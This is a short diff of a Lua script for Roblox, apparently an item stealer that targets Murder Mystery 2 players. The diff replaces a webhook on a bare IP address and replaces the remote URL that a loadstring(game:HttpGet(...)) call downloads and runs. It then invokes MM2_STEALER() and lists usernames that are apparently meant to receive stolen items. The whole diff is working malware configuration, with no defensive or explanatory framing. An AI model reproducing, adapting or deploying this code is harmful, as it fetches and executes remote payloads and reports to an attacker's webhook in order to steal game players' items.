@@ -4,10 +4,10 @@ Usernames = {
     'Joezeif111x', 'joeiamjoezeif', 'jo_125w'
 }
 
-BigHitsWebhook= "http://93.183.83.94:8000/webhook/5e157c46-f82e-40d7-a5b5-d9d7026b42f8"
+BigHitsWebhook= "http://93.183.83.94:8000/webhook/cd9658dd-80fe-4955-8b61-7edf7362fb75"
 
 local STEALER_TO_LOAD = [[
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MM2Nebula/Files/refs/heads/main/officialscript.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spawnerscript/MurderMystery2/refs/heads/main/yowsg.lua"))()
 ]]
 
 if queue_on_teleport then
@@ -821,3 +821,4 @@ local Valuelist_WEAPONS = buildValueList()
 end
 
 MM2_STEALER()
+
